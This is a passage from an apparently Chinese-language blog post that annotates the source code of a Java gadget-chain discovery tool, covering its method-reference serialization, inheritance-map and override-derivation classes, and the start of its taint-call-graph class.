class="function"><span class="keyword">public</span> MethodReference <span class="title">parse</span><span class="params">(String[] fields)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MethodReference(</span><br><span class="line">                <span class="keyword">new</span> ClassReference.Handle(fields[<span class="number">0</span>]),</span><br><span class="line">                fields[<span class="number">1</span>],</span><br><span class="line">                fields[<span class="number">2</span>],</span><br><span class="line">                Boolean.parseBoolean(fields[<span class="number">3</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(MethodReference obj) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String[] &#123;</span><br><span class="line">                obj.classReference.getName(),</span><br><span class="line">                obj.name,</span><br><span class="line">                obj.desc,</span><br><span class="line">                Boolean.toString(obj.isStatic),</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-inheritanceMap"><a href="#5-inheritanceMap" class="headerlink" title="5. inheritanceMap"></a>5. inheritanceMap</h3><p>定义<strong>继承信息</strong>的描述方式，包括 <code>子类-&gt;父类集合</code>、<code>父类-&gt;子类集合</code> 两个 Map 类型变量，根据类信息得出，具体实现在 <code>InheritanceMap</code> 类中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InheritanceMap</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; inheritanceMap;    <span class="comment">// 子类-&gt;父类集合</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; subClassMap;       <span class="comment">// 父类-&gt;子类集合</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构造函数，从 `子类-&gt;父类集合` 得出 `父类-&gt;子类集合`</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inheritanceMap 继承关系</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InheritanceMap</span><span class="params">(Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; inheritanceMap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">        subClassMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; entry : inheritanceMap.entrySet()) &#123;</span><br><span class="line">            ClassReference.Handle child = entry.getKey();</span><br><span class="line">            <span class="keyword">for</span> (ClassReference.Handle parent : entry.getValue()) &#123;</span><br><span class="line">                <span class="comment">// 如果 key 不存在，则创建，最后返回 value</span></span><br><span class="line">                subClassMap.computeIfAbsent(parent, k -&gt; <span class="keyword">new</span> HashSet&lt;&gt;()).add(child);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Set&lt;Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt;&gt; entrySet() &#123;</span><br><span class="line">        <span class="keyword">return</span> inheritanceMap.entrySet();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回父类集合</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz 目标类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;ClassReference.Handle&gt; getSuperClasses(ClassReference.Handle clazz) &#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; parents = inheritanceMap.get(clazz);</span><br><span class="line">        <span class="keyword">if</span> (parents == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Collections.unmodifiableSet(parents);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断目标父类是否为目标子类的父类</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz      目标子类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> superClass 目标父类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSubclassOf</span><span class="params">(ClassReference.Handle clazz, ClassReference.Handle superClass)</span> </span>&#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; parents = inheritanceMap.get(clazz);</span><br><span class="line">        <span class="keyword">if</span> (parents == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> parents.contains(superClass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回子类集合</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz 目标类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;ClassReference.Handle&gt; getSubClasses(ClassReference.Handle clazz) &#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; subClasses = subClassMap.get(clazz);</span><br><span class="line">        <span class="keyword">if</span> (subClasses == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Collections.unmodifiableSet(subClasses);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 存储继承关系：子类-&gt;父类集合</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// inheritanceMap.dat 数据格式：</span></span><br><span class="line">        <span class="comment">// 类名 父类或超类或接口类1 父类或超类或接口类2 父类或超类或接口类3 ...</span></span><br><span class="line">        DataLoader.saveData(Paths.get(<span class="string">&quot;inheritanceMap.dat&quot;</span>), <span class="keyword">new</span> InheritanceMapFactory(), inheritanceMap.entrySet());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 从 inheritanceMap.dat 加载继承关系信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InheritanceMap <span class="title">load</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; inheritanceMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; entry : DataLoader.loadData(</span><br><span class="line">                Paths.get(<span class="string">&quot;inheritanceMap.dat&quot;</span>), <span class="keyword">new</span> InheritanceMapFactory())) &#123;</span><br><span class="line">            inheritanceMap.put(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> InheritanceMap(inheritanceMap);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义<strong>继承信息</strong>的读写格式（仅针对 <code>子类-&gt;父类集合</code>）：<code>类名 父类/超类/接口类</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">InheritanceMapFactory</span> <span class="keyword">implements</span> <span class="title">DataFactory</span>&lt;<span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">ClassReference</span>.<span class="title">Handle</span>, <span class="title">Set</span>&lt;<span class="title">ClassReference</span>.<span class="title">Handle</span>&gt;&gt;&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; parse(String[] fields) &#123;</span><br><span class="line">        ClassReference.Handle clazz = <span class="keyword">new</span> ClassReference.Handle(fields[<span class="number">0</span>]);</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; superClasses = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">            superClasses.add(<span class="keyword">new</span> ClassReference.Handle(fields[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> AbstractMap.SimpleEntry&lt;&gt;(clazz, superClasses);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; obj) &#123;</span><br><span class="line">        <span class="keyword">final</span> String[] fields = <span class="keyword">new</span> String[obj.getValue().size()+<span class="number">1</span>];</span><br><span class="line">        fields[<span class="number">0</span>] = obj.getKey().getName();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle handle : obj.getValue()) &#123;</span><br><span class="line">            fields[i++] = handle.getName();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fields;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-InheritanceDeriver"><a href="#6-InheritanceDeriver" class="headerlink" title="6. InheritanceDeriver"></a>6. InheritanceDeriver</h3><p>实现<strong>继承信息</strong>和<strong>重写方法信息</strong>的收集，存储重写信息时以缩进表示重写方法，具体存储格式在 <code>GadgetChainDiscovery</code> 中给出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InheritanceDeriver</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(InheritanceDeriver.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取继承信息：子类-&gt;父类集合、父类-&gt;子类集合</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classMap 类信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InheritanceMap <span class="title">derive</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap)</span> </span>&#123;</span><br><span class="line">        LOGGER.debug(<span class="string">&quot;Calculating inheritance for &quot;</span> + (classMap.size()) + <span class="string">&quot; classes...&quot;</span>);</span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; implicitInheritance = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="comment">// 遍历所有类</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference classReference : classMap.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (implicitInheritance.containsKey(classReference.getHandle())) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Already derived implicit classes for &quot;</span> + classReference.getName());</span><br><span class="line">            &#125;</span><br><span class="line">            Set&lt;ClassReference.Handle&gt; allParents = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取 classReference 的所有父类、超类、接口类</span></span><br><span class="line">            getAllParents(classReference, classMap, allParents);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加缓存：类名-&gt;所有的父类、超类、接口类</span></span><br><span class="line">            implicitInheritance.put(classReference.getHandle(), allParents);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> InheritanceMap(implicitInheritance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取目标类的所有父类、超类、接口类</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classReference 目标类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classMap       类信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> allParents     父类、超类、接口类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getAllParents</span><span class="params">(ClassReference classReference, Map&lt;ClassReference.Handle, ClassReference&gt; classMap, Set&lt;ClassReference.Handle&gt; allParents)</span> </span>&#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; parents = <span class="keyword">new</span> HashSet&lt;&gt;();   <span class="comment">// 已知当前父类和接口</span></span><br><span class="line">        <span class="comment">// 把当前 classReference 类的所有父类添加到 parents</span></span><br><span class="line">        <span class="keyword">if</span> (classReference.getSuperClass() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            parents.add(<span class="keyword">new</span> ClassReference.Handle(classReference.getSuperClass()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 把当前 classReference 类实现的所有接口添加到 parents</span></span><br><span class="line">        <span class="keyword">for</span> (String iface : classReference.getInterfaces()) &#123;</span><br><span class="line">            parents.add(<span class="keyword">new</span> ClassReference.Handle(iface));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从类数据集合中，遍历找出 classReference 的直接父类/接口</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle immediateParent : parents) &#123; <span class="comment">// 查找直接父类信息</span></span><br><span class="line">            ClassReference parentClassReference = classMap.get(immediateParent);</span><br><span class="line">            <span class="keyword">if</span> (parentClassReference == <span class="keyword">null</span>) &#123;</span><br><span class="line">                LOGGER.debug(<span class="string">&quot;No class id for &quot;</span> + immediateParent.getName());</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加到 allParents 父类集合中</span></span><br><span class="line">            allParents.add(parentClassReference.getHandle());</span><br><span class="line">            <span class="comment">// 递归查找，直到把 classReference 类的所有父类、超类、接口类都添加到 allParents</span></span><br><span class="line">            getAllParents(parentClassReference, classMap, allParents);  <span class="comment">// 递归查找父类的父类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取类的所有重写方法</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inheritanceMap 继承关系</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> methodMap      方法信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; getAllMethodImplementations(</span><br><span class="line">            InheritanceMap inheritanceMap, Map&lt;MethodReference.Handle, MethodReference&gt; methodMap) &#123;</span><br><span class="line">        <span class="comment">// 存储类的方法，类-&gt;方法集合</span></span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodsByClass = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="comment">// 遍历方法信息，获取类-&gt;方法集合</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            ClassReference.Handle classReference = method.getClassReference();  <span class="comment">// 获取类</span></span><br><span class="line">            <span class="keyword">if</span> (!methodsByClass.containsKey(classReference)) &#123;  <span class="comment">// 避免重复</span></span><br><span class="line">                Set&lt;MethodReference.Handle&gt; methods = <span class="keyword">new</span> HashSet&lt;&gt;();  <span class="comment">// 存储方法</span></span><br><span class="line">                methods.add(method);</span><br><span class="line">                methodsByClass.put(classReference, methods);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                methodsByClass.get(classReference).add(method); <span class="comment">// 添加方法</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 存储继承关系，父类-&gt;子类集合</span></span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; subClassMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; entry : inheritanceMap.entrySet()) &#123;</span><br><span class="line">            <span class="comment">// 从 子类-&gt;父类集合 中取出父类</span></span><br><span class="line">            <span class="keyword">for</span> (ClassReference.Handle parent : entry.getValue()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!subClassMap.containsKey(parent)) &#123; <span class="comment">// 避免重复</span></span><br><span class="line">                    Set&lt;ClassReference.Handle&gt; subClasses = <span class="keyword">new</span> HashSet&lt;&gt;();    <span class="comment">// 存储子类</span></span><br><span class="line">                    subClasses.add(entry.getKey());</span><br><span class="line">                    subClassMap.put(parent, subClasses);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    subClassMap.get(parent).add(entry.getKey());    <span class="comment">// 添加子类</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查找重写方法</span></span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="comment">// 遍历方法集合</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference method : methodMap.values()) &#123;</span><br><span class="line">            <span class="comment">// Static methods cannot be overriden</span></span><br><span class="line">            <span class="keyword">if</span> (method.isStatic()) &#123;    <span class="comment">// 静态方法不能被重写</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 存储重写方法</span></span><br><span class="line">            Set&lt;MethodReference.Handle&gt; overridingMethods = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">            Set&lt;ClassReference.Handle&gt; subClasses = subClassMap.get(method.getClassReference());    <span class="comment">// 方法所属类的子类集合</span></span><br><span class="line">            <span class="keyword">if</span> (subClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 遍历子类</span></span><br><span class="line">                <span class="keyword">for</span> (ClassReference.Handle subClass : subClasses) &#123;</span><br><span class="line">                    <span class="comment">// This class extends ours; see if it has a matching method</span></span><br><span class="line">                    Set&lt;MethodReference.Handle&gt; subClassMethods = methodsByClass.get(subClass); <span class="comment">// 类的方法集合</span></span><br><span class="line">                    <span class="keyword">if</span> (subClassMethods != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (MethodReference.Handle subClassMethod : subClassMethods) &#123;</span><br><span class="line">                            <span class="comment">// 判断方法名称和描述符是否相等</span></span><br><span class="line">                            <span class="keyword">if</span> (subClassMethod.getName().equals(method.getName()) &amp;&amp; subClassMethod.getDesc().equals(method.getDesc())) &#123;</span><br><span class="line">                                overridingMethods.add(subClassMethod);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果存在重写方法，则保存到 methodImplMap 中</span></span><br><span class="line">            <span class="keyword">if</span> (overridingMethods.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                methodImplMap.put(method.getHandle(), overridingMethods);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> methodImplMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-GraphCall"><a href="#7-GraphCall" class="headerlink" title="7. GraphCall"></a>7. GraphCall</h3><p>定义污点在<strong>调用关系</strong>中的传递信息，指的是被调用方法的参数受调用者方法的参数影响，使用 asm 访问者记录，涉及模拟 JVM 的一些操作，具体实现在 <code>CallGraphDiscovery</code> 类中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GraphCall</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle callerMethod;  <span class="comment">// 调用者（方法）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle targetMethod;  <span class="comment">// 被调用者（方法）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> callerArgIndex;   <span class="comment">// 调用者（方法）的参数索引</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String callerArgPath; <span class="comment">// 参数对象的哪个字段被传递</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> 